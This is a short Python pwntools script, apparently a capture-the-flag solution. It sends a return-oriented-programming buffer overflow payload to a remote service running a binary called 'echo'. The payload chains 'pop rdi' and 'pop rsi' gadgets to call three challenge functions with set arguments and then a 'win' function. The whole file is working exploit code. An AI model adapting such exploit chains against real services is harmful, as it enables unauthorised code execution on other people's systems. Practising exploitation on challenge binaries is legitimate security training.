#!/bin/env python3
from pwn import *

"""
0x00000000004006b3: pop rdi; ret;
0x00000000004006b1: pop rsi; pop r15; ret;
"""

pop_rdi = p64(0x00000000004006b3)
pop_rsi_r15 = p64(0x00000000004006b1)

elf = ELF("./echo")
p = remote("35.228.52.143", 6853)

'''
gdb.attach(p, """
    b *part_one
    b *part_two
    b *part_three
    b *win
""")
'''
print (p.recvline())

buf = b""
buf += b"A"*(48 + 8)

buf += p64(elf.symbols['part_one'])
buf += pop_rdi
buf += p64(0x1337)

buf += p64(elf.symbols['part_two'])
buf += pop_rdi
buf += p64(0x1337)

buf += pop_rsi_r15
buf += p64(0x1338)
buf += p64(0x41414141) # junk
buf += p64(elf.symbols['part_three'])
buf += p64(elf.symbols['win'])

p.sendline(buf)
p.interactive()
